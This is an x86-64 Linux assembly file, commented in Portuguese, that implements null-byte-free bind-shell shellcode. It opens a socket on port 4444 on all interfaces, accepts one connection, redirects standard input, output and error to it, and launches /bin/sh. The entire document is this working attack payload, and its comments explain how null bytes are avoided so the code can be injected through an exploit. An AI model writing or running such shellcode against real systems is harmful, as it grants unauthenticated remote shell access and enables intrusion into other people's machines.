; Porta: 4444 (0x115c → LE = 0x5c11, zero-free)
; Bind:  0.0.0.0 (todas as interfaces)

[BITS 64]
global _start

_start:
    ;============================================================
    ; socket(AF_INET, SOCK_STREAM, 0)
    ; syscall: 41
    ;============================================================
    xor rax, rax
    mov al, 41              ; __NR_socket
    xor rdi, rdi
    mov dil, 2              ; AF_INET = 2
    xor rsi, rsi
    mov sil, 1              ; SOCK_STREAM = 1
    xor rdx, rdx            ; protocol = 0
    syscall

    mov r9, rax             ; r9 = sockfd (callee-saved: sobrevive às próximas syscalls)

    ;============================================================
    ; Monta sockaddr_in na pilha: 0.0.0.0:4444
    ; sin_family = 2 (AF_INET)
    ; sin_port   = 0x5c11 (4444 em network order, zero-free)
    ; sin_addr   = 0x00000000 (INADDR_ANY, já zero com push rax)
    ;============================================================
    xor rax, rax
    push rax                ; 8 bytes de zeros (sin_zero + sin_addr)
    push rax                ; mais 8 bytes (começo da struct)

    ; sin_family sem null bytes na instrução
    xor eax, eax            ; 31 C0
    inc al                  ; FE C0
    inc al                  ; FE C0  (al = 2 = AF_INET)
    mov [rsp], ax           ; 66 89 04 24  — zero-free

    ; sin_port = 4444 → htons(4444) = 0x115c → LE = 0x5c11 (zero-free)
    mov ax, 0x5c11
    mov [rsp+2], ax

    ; sin_addr fica zero (0.0.0.0) dos push rax acima

    ;============================================================
    ; bind(sockfd, &sockaddr_in, 16)
    ; syscall: 49
    ;============================================================
    mov rdi, r9             ; sockfd
    mov rsi, rsp            ; &sockaddr_in
    xor rdx, rdx
    mov dl, 16              ; sizeof(sockaddr_in)
    xor rax, rax
    mov al, 49              ; __NR_bind
    syscall

    ;============================================================
    ; listen(sockfd, 0)
    ; syscall: 50
    ;============================================================
    mov rdi, r9
    xor rsi, rsi            ; backlog = 0
    xor rax, rax
    mov al, 50              ; __NR_listen
    syscall

    ;============================================================
    ; accept(sockfd, NULL, NULL) → clientfd
    ; syscall: 43
    ;============================================================
    mov rdi, r9
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    mov al, 43              ; __NR_accept
    syscall                 ; bloqueia até alguém conectar

    mov rdi, rax            ; rdi = clientfd (arg1 das dup2)

    ;============================================================
    ; dup2 loop: cobre fd 2, 1, 0 em ordem decrescente
    ; Mais compacto que 3 blocos separados
    ; syscall: 33
    ;============================================================
    xor rsi, rsi
    mov sil, 2              ; começa em 2 (stderr)

dup2_loop:
    xor rax, rax
    mov al, 33              ; __NR_dup2
    syscall                 ; dup2(clientfd, rsi)
    dec rsi
    jns dup2_loop           ; jump if not signed: repete enquanto rsi >= 0

    ;============================================================
    ; execve("//bin/sh", NULL, NULL)
    ; syscall: 59
    ;============================================================
    xor rax, rax
    push rax                ; null terminator da string

    mov rbx, '//bin/sh'     ; 0x68732f6e69622f2f
    push rbx
    mov rdi, rsp            ; rdi = &"//bin/sh"

    xor rsi, rsi            ; argv = NULL
    xor rdx, rdx            ; envp = NULL
    mov al, 59              ; __NR_execve
    syscall
